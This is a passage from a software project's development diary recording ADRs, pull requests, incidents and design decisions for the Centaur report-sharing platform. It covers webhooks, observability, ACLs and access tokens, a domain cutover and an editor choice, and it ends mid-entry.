2. **`livemode` boolean → `mode` enum** (`"prod"`/`"dev"`) on every wire resource — amends
   ADR-0053 §4 (same day, before any external consumer). Reads self-evidently + leaves room for
   more deployment kinds. Another breaking wire change (owned consumers, atomic).

This PR is itself a breaking change, so on merge it should finally cut **v2.0.0** — validating
the release-config fix. 282 unit tests + typecheck + docs:check green.

Next priorities (queued): (1) soft-delete for **users** (reports already have `deleted_at`);
(2) OpenTelemetry — structured logs with a `trace_id` across the stack.

### 2026-06-23 — User soft-delete via Clerk webhook (ADR-0054), worktree `feat/user-soft-delete`

PR #97 merged → **v2.0.0 cut** (the release-config fix works: `BREAKING CHANGE:` now drives
the major). Live API confirmed serving the `mode` enum + envelope.

Then started **user soft-delete** (priority 1). Operator decisions (grilled): trigger =
**Clerk `user.deleted` webhook**; cascade = **revoke API keys, keep org + reports**;
reactivation = **blocked (terminal)**. Recorded as **ADR-0054** (un-defers the ADR-0048
webhook, scoped to `user.deleted`). Built:
- `users.deleted_at` + partial purge index (migration `0006`), mirroring reports.
- `IdentityStore.softDeleteByClerkId` + `findByClerk` deleted-filter + `createPersonalIdentity`
  resurrection-block (the "terminal" rule); `ApiKeyStore.revokeAllForUser` cascade;
  `handleUserDeleted` use case. In-memory fakes (+ new `InMemoryApiKeyStore`) + pglite
  integration tests (soft-delete, block, bulk revoke).
- `POST /webhooks/clerk` route — **zero new deps** (`@clerk/backend`'s `verifyWebhook` against
  `CLERK_WEBHOOK_SIGNING_SECRET`); fails closed (503 unset / 400 bad sig); idempotent.

290 unit tests + typecheck + docs:check green. **Infra:** the operator registered the Clerk
`user.deleted` webhook endpoint for app.agranado.com; the Terraform now provisions
`CLERK_WEBHOOK_SIGNING_SECRET` onto the **app** Vercel project (production target, ADR-0054)
from `var.clerk_webhook_signing_secret` — OPTIONAL (default ""), so the env var is omitted
(route stays 503) until `TF_VAR_clerk_webhook_signing_secret` is set in `.tfvars.local` **and**
the `CLERK_WEBHOOK_SIGNING_SECRET` GitHub Actions secret (CI applies infra, ADR-018). Bumped
to 292 tests after the claude-review self-healing-cascade fix (PR #98). Follow-ups: restore
flow; orphaned personal-org cleanup. Worktree `feat/user-soft-delete`.

### 2026-06-23 — OpenTelemetry observability design (ADR-0055), worktree `feat/observability-otel`

Grilled the observability design (priority 2) and recorded **ADR-0055**. Decisions: **three
pillars** (traces+metrics+logs) → **Grafana Cloud** (Tempo/Loki/Mimir; chosen largely for the
richest **MCP server**, `grafana/mcp-grafana`, so an agent can query telemetry) → **direct OTLP,
no collector**. **`@vercel/otel`** on the Vercel apps (solves span-flush-before-freeze; `fetch`
auto-instr → MCP→/api/v1 continuity), **`otel-cf-workers`** on the cron Worker, **`view`
deferred**. Async pipeline linked via **span links** (new `scan_jobs.trace_context` col, captured
in the scan-queue adapter, linked at the drain) + always-on `report.id`/`version.id` attributes.
Logs: **`pino` + instrumentation-pino → OTLP → Loki** from a shared **`packages/observability`**;
domain/application stay pure (ADR-0024). Metrics emitted from the functions (auto HTTP RED +
custom counters; delta temporality; per-invocation flush; low-cardinality labels only). **100%
sampling** pre-launch. Redaction at source (no collector): deny secrets/report-content/auth-
headers/email; prefer `report_id` over `slug` (capability URL, ADR-0038). **`Request-Id` is now
`req_<base62(trace_id)>` — amends ADR-0053 §5** (one id; decodes straight to a Tempo trace).
Config optional/fail-open; Grafana token wired like the Clerk webhook secret. Not yet implemented
— ADR + glossary only this pass. Riskiest open item to validate first: metrics flush on Vercel
serverless (`@vercel/otel`'s metrics flush is weaker than spans).

### 2026-06-24 — Report sharing & ACLs design (ADR-0056), worktree `feat/report-acls`

Grilled the full sharing/ACL epic (operator chose: both report view-ACLs + folder collaborators,
all four modes) and recorded **ADR-0056**. Today every clean report is fully public-by-slug; the
schema (`acls`, `folder_collaborators`) + enums + `grant_` prefix exist but with **zero code**.
Keystone decisions: **(1)** enforcement = the **app authorizes, the viewer verifies** — private
report → redirect to `app.` (has Clerk + runs the `Acl` check) → mint a short-lived signed
**access token** → back to `view.?access=`; **(2)** token = **HMAC compact, slug-bound, ~15-min,
stateless**, shared `VIEW_ACCESS_TOKEN_SECRET`; **(3)** `Acl` is an aggregate member of `Report`,
loaded on single reads, **default-public on missing** (no backfill), enforcement combinable with
folder grants (P4); **(4)** the viewer is the R2-masking gateway and gates the **full bundle**
(entry + assets) via a report-scoped **unlock cookie** (a self-issued capability, NOT Clerk creds
→ ADR-002/0038 isolation preserved). A dedicated CF-Worker edge gateway is a separate future ADR.
Phased P1→P5 (foundation+public/password → org → allowlist → folder collaborators → UserCreated
grant resolution). Building **P1** now (TDD). Worktree `feat/report-acls`.

### 2026-06-24 — P1 (foundation + public/password) complete on `feat/report-acls`

Built the whole password-mode sharing path TDD (9 feature commits, all green: 328 unit tests +
a pglite ACL round-trip). Layers: **`Acl` value object** (4 modes + validation) → **`Acl` on the
`Report` aggregate** (LEFT JOIN `acls`, default-public on missing, `setAcl` upsert) → **`setAcl`
use case** (`acl:write` scope + org check, hashes via the PasswordHasher port) → **argon2id
adapter** (`@node-rs/argon2`, new dep) → **access-token codec** (HMAC, slug-bound, ~15-min,
`node:crypto`) → **`set_acl` API route** (`POST /api/v1/reports/{slug}/acl`; openapi `Acl`/
`Report` schemas; the single-report wire resource now carries `acl`, never the hash; owners gain
`acl:write`) → **`resolveAccessDecision`** (the viewer's pure private-report gate) → **viewer
enforcement + app `/unlock/{slug}` route** (password form → argon2id verify → mint token →
`VIEW_ORIGIN/{slug}?access=…` → unlock cookie; org/allowlist show "not yet available") →
**infra**: self-generated `VIEW_ACCESS_TOKEN_SECRET` in `shared_env` (same value app+view),
`APP_ORIGIN` already present. `org`/`allowlist` are set-able but enforced in P2/P3 (viewer fails
closed). New runtime dep: `@node-rs/argon2`. Next: open the PR for P1.

### 2026-06-25 — P1 sharing/ACLs shipped (#100); two incidents; OTel finally exporting

P1 merged (#100). Then a cascade worth recording:
- **P0 prod-down (#101):** `@node-rs/argon2`'s native `.node` was `ssr.external` but only a dep of
  `packages/adapters` → not resolvable from `apps/*` node_modules under pnpm-strict → Vercel never
  traced it into the lambda → every app/view route 500'd `ERR_MODULE_NOT_FOUND`. CI was green (smoke
  only hit `/health`, which doesn't import the container). Fix: declare argon2 as a direct dep of
  both apps. **#103/#104** then hardened the preview smoke to probe `/api/v1/reports` (→401 not 500)
  so a module-load crash can't pass CI green again.
- **OTel was silently dropping everything (ADR-0055 spike):** SDK initialized (real trace_ids) but
  Tempo+Loki empty. Root cause #1: `OTEL_EXPORTER_OTLP_HEADERS` used `Basic%20<token>` — the OTLP
  exporter didn't percent-decode it → Grafana 401 (a raw OTLP curl with a literal space → 200,
  proving endpoint+auth). Fixed the GH secret to a literal space. Root cause #2: even then, traces
  didn't ship — `@vercel/otel`'s implicit export wasn't sending the app's spans to our OTLP endpoint.
  Fix (this PR): construct **explicit** OTLP trace+log exporters in `telemetry.ts` with the endpoint
  + headers parsed/`decodeURIComponent`-decoded from env, passed to `registerOTel`. Verify after
  deploy: Tempo `{resource.service.name="arp-app"}` + Loki `{service_name="arp-app"}` should populate.
  **Lesson:** Terraform is path-filtered to `infra/terraform/**`, so a secret change needs an infra
  change or `workflow_dispatch` apply + a fresh deploy to reach the runtime.

### 2026-06-25 — Apex domain cutover: agranado.com → centaurspec.com (product = "Centaur")

Bought **centaurspec.com** (Cloudflare Registrar) as the real product domain. `agranado.com` was only
ever a placeholder for the product **and** is the operator's personal domain, so it stays — only the
product's `app`/`view`/`mcp`/`clerk`/`accounts` subdomains moved off it.

Mechanics (PR #107, infra apply shared→prod):
- **One knob:** the `APEX_DOMAIN` GitHub Actions repo variable → `centaurspec.com`. Terraform fans it
  out to every origin env var, Vercel custom-domain binding, and DNS record. `shared` plan was
  **12 add / 12 destroy** (every `cloudflare_record` `-/+` — the `zone_id` change forces replacement, so
  records moved zones; the old agranado.com product records were destroyed, not orphaned).
- **Clerk live instance re-domained** to `clerk.centaurspec.com` / `accounts.centaurspec.com`. The
  `pk_live` encodes the Frontend API host, so it changed → updated `CLERK_PUBLISHABLE_KEY_PROD` +
  `CLERK_SECRET_KEY_PROD`. Same instance kept ⇒ user IDs + reports preserved.
- **DKIM cluster id changed on re-domain** (`d6r9n5il5s3x` → `iqr5g5hmntgy`) → re-pointed
  `clk._domainkey`/`clk2._domainkey`/`clkmail` in `local.clerk_records`.

Two gotchas that bit (both now in `infra.md`):
1. **Vercel deploy vs Terraform-env race** — the merge-built prod deployments snapshot env *before*
   `apply-prod` updates it, so the apps served stale `agranado.com` origins + old `pk_live` (MCP
   advertised `mcp.agranado.com`). Fix: **redeploy** all three prod projects (Vercel API `forceNew=1`)
   after the apply. Worth automating a post-apply redeploy step. (See memory `vercel-env-redeploy-race`.)
2. **Google OAuth `redirect_uri_mismatch`** — social login broke because the Google Cloud OAuth client
   still allow-listed `clerk.agranado.com/v1/oauth_callback`. Fix: add the new `clerk.centaurspec.com`
   callback + JS origins in Google Cloud Console. Every social provider's OAuth app needs this on a
   re-domain.

Verified live: DNS (app/view/mcp/clerk/accounts), TLS, Clerk jwks 200, MCP OAuth metadata =
`mcp.centaurspec.com` / `clerk.centaurspec.com`, app `pk_live` decodes to `clerk.centaurspec.com`,
email **and** Google login working. Resend's domain moved with the apex, but the app doesn't send mail
in code (Clerk handles auth email), so no Resend re-verification was needed.

Residual (non-blocking): previously-shared `view.agranado.com/<slug>` links are dead (single-apex
model, no redirect); MCP connectors must be re-added at `mcp.centaurspec.com`; confirm the Clerk
`user.deleted` webhook URL now points at `app.centaurspec.com/webhooks/clerk`; remove the stale
agranado.com Google redirect URI when convenient.

## 2026-06-27 — Report sharing / ACLs: allowlist phase + revocation-C enforcement (ADR-0056/0057)

Catch-up entry (the log skipped the sharing epic). **ADR-0056** (report sharing / ACLs) + **ADR-0057**
(transactional email via Resend) drive a multi-mode viewer-access feature on the `Acl` aggregate:
`public` (live since ADR-0038) / `password` / `org` / `allowlist`. **P1 (public/password)** shipped — the
app `/unlock/{slug}` route mints a slug-bound HMAC `Access token` (app mints, the credential-free view
origin verifies); the viewer swaps the `?access` hand-off for an HttpOnly, path-scoped `Unlock cookie`.
`org` is deferred (owner-only single-member orgs for now).

**Allowlist phase** (PRD #109), built slice-by-slice, each its own PR + bot-reviewed:
- 5a `report_grants` table + `GrantStore` (migration 0008) — durable, revocable grants, PK `(report_id,email)`.
- 1–4 foundations: owner-set `access_ttl_seconds` on the Acl; `EmailSender`/Resend; `NonceStore`/Upstash
  (single-use GETDEL); the magic-link codec (HMAC over a nonce id).
- 5b `sendMagicLink` + `redeemMagicLink` use cases (privacy-preserving send; redeem re-validates the
  allowlist + creates the grant).
- 5c the `/unlock` allowlist branch — email form → send; **POST-only redemption via a confirm
  interstitial** so email link scanners (SafeLinks/Gmail prefetch) can't burn the one-time nonce
  (claude-review #116); frame-guarded raw responses.
- 5d (**this PR #117** — keystone): **revocation-C now enforces.** The access token carries the redeemed
  `email`; the viewer's `resolveAccessDecision` is async + gates an allowlist serve on **both** current
  allowlist membership AND a live `report_grants` row, **per request**. So removing an email denies on
  the very next request — independent of `setAcl` pruning the grant (5e). Cookie `maxAge` = the grant's
  TTL, so long grants aren't re-prompted; revocation stays immediate via the per-request check.

Decision recorded: the viewer's **dual gate** (live allowlist membership + live grant) is defense-in-depth
— the allowlist is the live source of truth; the grant proves redemption + bounds expiry.

Remaining: **5e** `setAcl` revoke-on-change (proactively delete grants on email-removal / mode-switch) +
rate-limit; **6** e2e + docs. Active worktree: `viewer-grant-check` (PR #117).

### 2026-06-29 — Forge & Ember: the Centaur UI redesign (4 PRs)

After the apex cutover (#107) Centaur had a name + domain but a placeholder UI (Linear-indigo, light
theme, emoji icons, "ai-report-platform" in the page titles). Direction came from web research +
operator review of three candidate palettes — published as **clickable mockups via Centaur itself**
(dogfooding the viewer at `view.centaurspec.com`): chosen **"Forge & Ember"**, a warm-dark craft-tech
identity (copper `#c8762d` → ember `#e8a04c` on warm ink `#1a1410`, parchment text, sage accent).
**ADR-0058** records it (amends ADR-0050).

Shipped as four sequenced PRs, each bot-reviewed and `/pr-iterate`'d to green:

- **#119 — design tokens.** Retheme `apps/app/app/styles/theme.css` to warm-dark **by default**; the
  ADR-0050 `@theme inline` → `var()` indirection re-skinned 100% of the UI with **zero component-class
  changes**. Clerk `appearance` re-keyed; `color-scheme: dark` added (review catch). New tokens:
  `--color-accent` (sage), `--font-serif`.
- **#120 — brand chrome.** A global `TopBar` (Centaur logomark + serif wordmark + Upload + avatar),
  rendered inside `<SignedIn>` so it stays off the public sign-in page; the avatar menu gains an
  "API keys & MCP" link via Clerk `UserButton.MenuItems`. Inline SVG icon set replaces the emoji
  (no icon-library runtime dep, ADR-0050). Page `<title>`s → "Centaur".
- **#121 — inline rename + reports-list redesign.** Click a report title to rename it in place
  (`EditableReportTitle` + `useFetcher`; the `rename-report` action now returns JSON so the list
  revalidates in place instead of navigating). Escape cancels reliably; rejected renames surface the
  error. Rows: a doc icon that opens the report, slug/folder chips, a status pill (motion-safe pulse),
  and a **no-JS `<details>` "⋯" menu** for Move/Delete (CSP/Trusted-Types-safe).
- **#123 — Settings → API keys & MCP.** A settings sub-nav + a **"Connect to Claude" helper** that
  surfaces the `mcp.<apex>/mcp` endpoint (derived from the app origin, no `MCP_ORIGIN` env in the app)
  with copy; refined key rows (masked prefix, Active/Revoked pills). Glossary notes "MCP token" is a
  UI synonym for the `arp_` `ApiKey`, not a separate credential.

No backend/contract changes beyond the rename action's redirect→JSON. The real **marketing landing
page** (a new `apps/marketing` on the apex `centaurspec.com`) is **parked** — a Forge & Ember HTML
mockup is published via Centaur for reference, to become the real Remix app later (plan PRs a–e).
Process note: typecheck/biome/build were verified locally before each push. Active worktree:
`docs/forge-ember-diary` (this entry).

### 2026-06-29 — Product name resolved: Centaur / Centaur Spec

Settled the long-open "final project name" question (the working title was `ai-report-platform`).
The brand is **Centaur** (the short wordmark in the app chrome) and the full name is **Centaur Spec**
(prose, docs, and the viewer / MCP / OpenAPI surfaces); domain `centaurspec.com`. PR #126 swept the old
name out of user-facing copy + project docs and the safe identifiers (root package → `centaur-spec`).
The **technical identity stays `ai-report-platform`** — the GitHub repo, Neon `project_name`, git
remote, local path, Terraform resources, and `arp-*` workspace packages — since renaming those breaks
git/infra/CI/state. (See the domain glossary's "Product name" note.)

### 2026-07-06 — Architecture deepening wave: /improve-codebase-architecture → PRs #128–#131

Ran `/improve-codebase-architecture` over the whole codebase (three parallel explorer agents:
hexagonal core / transport apps / test surface). The report — published via Centaur itself,
https://view.centaurspec.com/ZWHv3H00uf (rebuilt self-contained after the first upload proved the
viewer CSP correctly blocks CDN scripts) — surfaced 8 deepening candidates. The pattern: the deep
modules were exemplary (MCP `ApiClient`, viewer access core, `arp-http`), but the glue *around* them
was copy-pasted and untested. Implemented as four agent-authored PRs (one worktree each), all
bot-reviewed LGTM and `/pr-iterate`'d to green:

- **#128 — tenancy guard.** `loadOwnedReport`/`loadOwnedFolder` resolvers replace the ~11-site
  copy-pasted load → not-found (incl. soft-delete) → org-check triple; the guard matrix is tested
  once instead of ×7. Surfaced a latent bug — `create-folder` accepts a soft-deleted parent —
  tracked as **issue #132**.
- **#129 — sharing codec.** One signed-token codec behind the `Access token` + `Magic link`
  (wire-format golden vectors written *before* refactoring; pass unchanged), and an `EmailAddress`
  Value Object ending the 3× email-normalization duplication (the review-#114 drift class).
  Glossary gains **Signed-token codec** and **EmailAddress**.
- **#130 — route seam.** A `handle()` combinator owns the `/api/v1` choreography (actor resolution,
  body parse, id decode, Problem mapping, Request-Id) — previously inlined ×10 with zero tests; 405
  gets one wire shape (`MethodNotAllowed` in `problemFor`); the dashboard rejoins the one error
  authority + validating id decoders; new use-case seams (`listFolders`, `listApiKeys`/`create`/
  `revoke`, `getReportAcl`); the `authenticateApiKey` pass-through deleted in favor of a covered
  `principalToUploadActor` helper; `parseCursorParams` + `secretMatches` rehomed to `arp-http`.
- **#131 — test seams.** Port-contract suites run against BOTH the in-memory fake and the Drizzle
  adapter on pglite — immediately caught and fixed a real fake/real ordering divergence that had
  only been documented in a comment. `report-repository`'s SQL-string/mapper-export test deleted
  (mappers re-privatised); `makeAppTestHarness()` added; `packages/headers` went from 0 tests to a
  full ADR-013 characterization suite (+ injectable report-to URL). Merging main (#127's new
  migration) tripped pglite `beforeEach` timeouts under parallel workers → vitest `hookTimeout` 30s.

**Deliberately not done:** report candidate #8 (unify `ScanQueue`/`ScanWorkQueue`) — contradicts
ADR-0045's deliberate source-of-truth/delivery split; revisit only if the `drainScans` reconciler
grows with the real Scanner.

Process notes: two of the four parallel agents cross-contaminated each other's worktrees with
*uncommitted* edits (relative-path `cd` slips); caught via `git status`, all committed work was on
the correct branches, strays verified as duplicates and dropped. Lesson encoded in the agent briefs:
absolute paths + per-path staging, never `git add -A`. Flag per the update protocol: **PR #127
(private-by-default ACL) merged without a diary entry** — the current-state block reflects it only
incidentally (the #131 merge conflict); its own entry is still owed.

### 2026-07-06 — Ownership & shareability epic: ADR-0059/0060/0061 (docs wave), worktree `docs/report-ownership-adrs`

A gap analysis of report ownership/sharing vs the target product model (private-to-the-*person* by
default, org-wide sharing in company orgs, owner-granted write access) surfaced three misalignments:
`org` ACL mode is a stub (settable, MCP-advertised, but `unlock.$slug.tsx` has no branch for it —
ADR-0056 P2 never shipped); non-owner write grants have zero behavioral code (`folder_collaborators`
is schema-only); and — the real design tension — **ownership is org-scoped** ("owner = any member of
the owning org", ADR-0056), which turns every future team-org member into a full co-owner, the
opposite of the target model. Three ADRs recorded (operator decisions: creator-is-owner; private =
owner-only, admins get no content access; per-report write grants; `public` mode stays):

- **ADR-0059 — per-user report ownership.** `reports.owner_id` (creator = owner, backfilled from the
  version-1 uploader), writes owner-gated behind a `canWrite` seam, reads stay org-visible
  (metadata), ACL GET owner-only, `/open` owner-token mint gates on `ownerId` (the security
  keystone), folders stay org-scoped. Amends ADR-0056. Behavior-neutral today (all orgs
  single-member) — must be fully deployed **before** the first multi-member org exists.
- **ADR-0060 — per-report write grants.** `report_write_grants` keyed `(report_id, grantee_email)`,
  lazy user resolution (no P5 event dependency), one implicit level (rename/re-upload/move; NOT
  delete/set_acl/grants), `canWrite = isOwner OR hasWriteGrant`. **Supersedes ADR-009 + ADR-0056
  P4/P5** (folder collaborators — never implemented; table stays until a cleanup migration). Spec
  carries the ADR-009 supersession note at its next revision (flagged here per protocol; ADR-009 is
  inline in `docs/spec.html`).
- **ADR-0061 — org types & membership.** `orgs.kind` (`personal`/`team`), membership via Clerk
  invitations mirrored through the existing webhook ACL, admins get membership management (and a
  future ownership-transfer surface), never content superpowers. Scope decision now; build deferred.

Also corrected in this wave: the current-state block called sharing/ACL "paused" — stale since P1
(#100), the allowlist phase (#109 slices), and private-by-default (#127) all shipped; reworded.
Delivery plan for the epic: docs (this PR) → GitHub issues (epic + 5 groups: hygiene, ownership
foundation, org-mode enforcement, write grants, team-orgs scoping) → per-group implementation via
spawned Sonnet agents in worktrees, `/tdd`, `/pr-iterate`.
### 2026-07-06 — Editing & comments epic kickoff; editor spike verdict: ProseMirror

New epic scoped: **report versioning experience + authenticated editing + comments/annotations.**
In-scope: a version history list + visual diff between versions; authenticated editing, including
in-viewer editing directly on `view.centaurspec.com`; comments/annotations anchored to report content.
**Explicitly deferred to future epics:** AI-assisted suggestions and live co-editing (Yjs collab was
only smoke-tested in this spike, not scoped for delivery yet). One invariant holds across every surface
this epic touches, no exceptions: **no anonymous writes** — not on the app, not on the in-viewer editing
surface, not via the MCP server.

Before committing to an editing stack, ran a **two-sandbox spike** comparing Plate.js vs ProseMirror
against the real fixture (`spike/fixture/ai-readiness-report.html`) — two independent Sonnet-agent
builds under `spike/plate/` and `spike/prosemirror/`, each with its own test suite, both **verified
independently by the orchestrating agent** (ProseMirror 29/29, Plate 23/23) rather than taking either
agent's self-report at face value.

**Verdict: ProseMirror.** Rationale in one line: the two dimensions that matter most for this
product — HTML fidelity on bespoke classes and export cleanliness, because the artifact we sell *is*
the HTML — both went decisively to ProseMirror (Plate loses classes on any plugin-claimed tag, incl.
`p.desc`, and its "static" export ballooned 86.8 KB → 390 KB with `data-slate-*` instrumentation left
in); Plate's built-in suggestion-mode package saved real but one-time LOC (45 vs ProseMirror's
hand-rolled 106) that doesn't offset the fidelity loss. Full scorecard, accepted costs (custom
`tableNodes` for thead/tbody, generator-side auto-`<p>`-wrap normalization), and a v0 "Report HTML"
node/mark vocabulary are in `spike/DECISION.md` — that file is the direct input to the next four ADRs
(0059–0061 were claimed by the ownership wave above, so this epic starts at 0062):

- **ADR-0062** — editing model & "Report HTML" schema (ratifies the v0 sketch in `spike/DECISION.md`).
- **ADR-0063** — in-viewer editing on `view.centaurspec.com`, amending ADR-0038 (the viewer-origin
  split); gated on a security review given the viewer's untrusted-content threat model.
- **ADR-0064** — comments/annotations model (`canWrite` per ADR-0060's owner-or-write-grant seam).
- **ADR-0065** — version history & visual diff.

Active worktree: `worktree/spike-editor-eval` (branch `chore/spike-editor-eval`, this entry + the spike
sandboxes). Not yet merged; the ADRs above are the next work.

### 2026-07-07 — ADR wave: editing epic decisions ratified (ADR-0062–0067)

PR #144 (`chore/spike-editor-eval`) merged — the ProseMirror-vs-Plate.js spike verdict from the prior
entry is now on `main`. This wave turns that verdict, plus the rest of the editing epic scoped
2026-07-06, into six ADRs and their doc-integration.

- **ADR-0062** — editing model & "Report HTML" schema. Ratifies `spike/DECISION.md`'s vocabulary as
  binding: ProseMirror as the engine, the shell/body split, the v1 node/mark schema with a
  generic attr-retention rule, the `_source.json` sidecar as a lossless companion to the canonical
  HTML, edit-save as a normal upload through the existing ADR-0037 pipeline, and the `origin`
  attribute added to `ReportVersionUploaded`.
- **ADR-0063** — in-viewer editing. Amends ADR-0038: a second, tightly-scoped CSP profile on a new
  authenticated `GET /<slug>/edit` route only — the public route is untouched. Auth via a scoped
  edit token rhyming with ADR-0056's access-token codec. **Status gated on a `/security-review` pass
  before the implementation PR ships.**
- **ADR-0064** — comments & annotations. New **Authoring & Collaboration** bounded context; `Comment`
  aggregate, two-part anchor (relative position + version-pinned fallback), `canWrite`-gated (not
  read-only-viewer-commentable in v1), zero comment data on the public viewer route.
- **ADR-0065** — version history & visual diff. New `GET /api/v1/reports/{slug}/versions` list +
  `reports_list_versions` MCP tool; `prosemirror-changeset` diff over the ADR-0062 sidecar, with a
  labeled DOM-diff fallback when a sidecar is missing. Builds on ADR-0062.
- **ADR-0066** / **ADR-0067** — proposed-deferred stubs recording constraints only, not build
  authorization: AI suggestion mode (pending-mark mechanism, `canWrite`-gated acceptance, no LLM
  calls yet) and live co-editing (Yjs/`y-prosemirror`, spike-smoke-tested only; comment anchors are
  built Yjs-relative-position-compatible now so this doesn't force a re-anchoring migration later).

`spike/` (`DECISION.md`, `fixture/`, `plate/`, `prosemirror/`) deleted in this PR per ADR-0062 §8's
acceptance criterion — history preserves it at commit `393ec98` (PR #144) for anyone who needs to
re-run or re-read the sandboxes.

Doc-integration done in this same PR: `docs/adr/INDEX.md` (rows for 0062–0067), `docs/domain-glossary.md`
(new Authoring & Collaboration context section: `Comment`, `Annotation anchor`, `Thread`, `Editing
session`; new Reports & Folders terms: `Report HTML schema`, `Presentation shell`, `Editable body`,
`Edit token`), `docs/context-map.md` (fourth bounded context, event edges to Reports & Folders), and
`docs/events.md` (`ReportVersionUploaded` gains `origin`; `CommentAdded`/`CommentResolved` added).

Worktree: `worktree/adr-editing-epic` (branch `docs/adr-editing-epic`), this entry + the six ADR files
+ the doc-integration edits above. Not yet merged.

### 2026-07-07 — ADR-0065 slice 1: version-history read endpoint implemented

`GET /api/v1/reports/{slug}/versions` + the `reports_list_versions` MCP tool now exist end to end
(domain → application → adapters → http → route → MCP), built strictly TDD (red-green-refactor per
commit). Scope was deliberately the read surface only — the `prosemirror-changeset` visual diff from
ADR-0065 §3 is a later slice, since the editor (ADR-0062/0063) that produces `_source.json` sidecars
doesn't exist yet.

- **Schema**: migration `0010` adds `report_versions.origin` (`version_origin` enum, `upload` |
  `editor`, NOT NULL DEFAULT `upload`) — a brand-new enum type in the same migration as its column is
  safe in one transaction (the drizzle-kit ADD VALUE gotcha, #127, only bites an *existing* enum).
- **Domain**: `ReportVersion.origin` (defaults to `upload` at both `createReport`/`addVersion` so
  every pre-existing call site is unaffected); `upload-report.ts` now passes `origin: "upload"`
  explicitly. Also stamped `origin` onto the `ReportVersionUploaded` **event** — `docs/events.md` had
  already documented this from the ADR-0062–0067 doc-integration wave, but the event type itself
  hadn't caught up until this slice.
- **New External Id codecs**: `makeVersionId`/`versionIdToWire` and `makeUserId`/`userIdToWire`
  (`packages/domain/src/version-id.ts` / `user-id.ts`), mirroring `folder-id.ts` exactly. ADR-0052
  reserved both prefixes but no endpoint had exposed either id on the wire before this.
- **`ReportRepository.listVersions`**: a new lean `ReportVersionSummary` projection (parallel to
  `ReportSummary` — no manifest/content hash), cursor-paginated keyset on the version id DESC
  (ADR-0053), implemented + contract-tested against both `InMemoryReportRepository` and
  `DrizzleReportRepository` on pglite (ADR-0046). `uploaded_at` lives on the projection, not the pure
  domain `ReportVersion` — it's DB-stamped (`defaultNow()`), same rationale as `reports.created_at`
  being absent from the `Report` aggregate.
- **`listReportVersions` use case**: auth is *identical* to `getReport` (the same org-scoped
  `loadOwnedReport` guard) — confirmed by reading the actual code rather than ADR-0059's aspirational
  write-grantee carve-out, which turned out to **not be implemented yet** (`reports.owner_id` doesn't
  exist in `schema.ts` despite `docs/db-design.md` already documenting it — flagged, not fixed, out of
  scope for this slice).
- **Wire**: `uploaded_at` renders as ISO-8601 (`format: date-time`) — no prior wire timestamp
  convention to match, and ISO is unambiguous versus Stripe's epoch-seconds given the domain stores
  epoch ms internally.
- **Gate**: 565 unit/contract tests green (up from ~520), full `turbo typecheck` (11 packages) clean,
  `biome ci` clean, `docs:check` clean. No Bruno regen script exists in this repo (grepped — no hits)
  despite `CLAUDE.md`'s quick-reference implying one; `openapi.yaml` is hand-maintained.

Worktree: `worktree/report-versions-endpoint` (branch `feat/report-versions-endpoint`). Not yet merged.

### 2026-07-07 — rebased slice 1 onto PR #146 (ADR-0059 ownership foundation)

PR #146 (`feat/report-ownership`) landed on `main` while this slice was in flight: `reports.owner_id`
(migration `0010_reports_owner_id`), the `loadOrgReport`/`loadOwnedReport` split in `load-owned.ts`
(reads stay org-scoped; owner-gated writes are a separate guard), and the `canWrite` seam. Rebased
`feat/report-versions-endpoint` onto it, commit by commit (`git rebase origin/main`).

- **Migration renumber**: our `0010_abandoned_bloodstorm.sql` (the `report_versions.origin` enum +
  column) collided with `0010_reports_owner_id.sql`. Resolved by regenerating rather than hand-renaming:
  reset `packages/db/drizzle/meta/{_journal,0010_snapshot}.json` to main's post-#146 state, then ran
  `drizzle-kit generate --name=report_versions_origin` against the rebased schema, which produced
  `0011_report_versions_origin.sql` with byte-identical SQL to the original. `docs/db-design.md`'s
  migration-number reference for `origin` updated 0010 → 0011 to match.
- **`user-id.ts` / `user-id.test.ts` / `report.test.ts` conflicts**: both branches independently added
  the same `makeUserId`/`userIdToWire` codec and the same `Report.ownerId` / version-`origin` test
  cases (parallel work, same day). Reconciled as unions — merged doc comment covering both `owner` and
  `uploaded_by` wire consumers; kept all test cases from both sides (no behavior lost either way).
- **Auth semantics reconciled (ADR-0065 §1, "identical to single-report GET")**: our
  `listReportVersions` was written against the pre-#146 world where `loadOwnedReport` was the only
  guard and *was* org-scoped. Post-#146, `loadOwnedReport` now means something different — owner-only,
  requiring `actor.userId` — so leaving the call as-is would have silently narrowed version listing to
  the owner only, breaking parity with `getReport`. Switched `listReportVersions` to call the new
  `loadOrgReport` (org-scoped reads, `{orgId}`-only actor) instead, matching `getReport`'s *actual*
  post-#146 implementation exactly. Confirmed by reading `get-report.ts`: it also does not yet
  implement ADR-0059 §3's "write-grantee metadata carve-out" — `ADR-0060` write grants are still
  schema-only (`report_grants` table exists, no `hasWriteGrant` in code) — so there is nothing for
  `listReportVersions` to carve out either. This mirrors the "flagged, not fixed, out of scope" note
  from this slice's original entry above: the aspirational ADR-0059 §3 carve-out remains unimplemented
  on both endpoints; when it lands on `getReport` it must land on `listReportVersions` in the same
  change (comment added at both call sites to that effect). Behavior otherwise unchanged: an org
  member reads version history, a cross-org actor gets `NotAllowed`, missing/soft-deleted reads
  `NotFound` — same three cases `get-report.test.ts` covers, and `list-report-versions.test.ts`
  already asserted exactly this shape (no test changes needed, only the implementation and its
  comments).
- **Gate** (full, from the worktree root, post-rebase): `biome ci .` clean, `turbo typecheck` (11
  packages) clean, `vitest run` — 97 files / 589 tests green (up from 565 pre-rebase, PR #146's own
  suite included), `docs:check` clean.

Still the same worktree/branch as above; not yet merged.

### 2026-07-07 — Ownership & shareability epic: implementation wave (G1/G5 merged, G2+G3 this PR)

The epic recorded 2026-06-17 (ADR-0059/0060/0061, PR #135 + review-fixes #136) is now shipping.
Issues #137–#142 were filed to track the five delivery groups (G1–G5) plus the tracking epic #142;
each group is a spawned agent in its own worktree.

- **G5 — sharing/ACL hygiene (#137), merged PR #143.** Independent of ownership: `setAcl`'s
  `report_grants` pruning-before-persist ordering (the 5e fix flagged by an earlier review) plus a
  repo-wide lint-clean pass. No schema change.
- **G1 — ownership foundation (#138), merged PR #146.** `Report.ownerId` (ADR-0059) — the creator,
  not "any org member", is the owner. Migration `0010` (nullable `owner_id` → backfill from the v1
  uploader → `NOT NULL` → index) applied and backfilled in prod via `migrate-db` (no drizzle-kit
  one-transaction enum gotcha here — no enum involved, #127 doesn't apply). `load-owned.ts` split
  into `loadOrgReport` (reads, org-scoped) / `loadOwnedReport` (owner-gated writes: delete, setAcl) /
  `canWrite` + `loadWritableReport` (the seam for rename/re-upload/move — `isOwner` only in this PR,
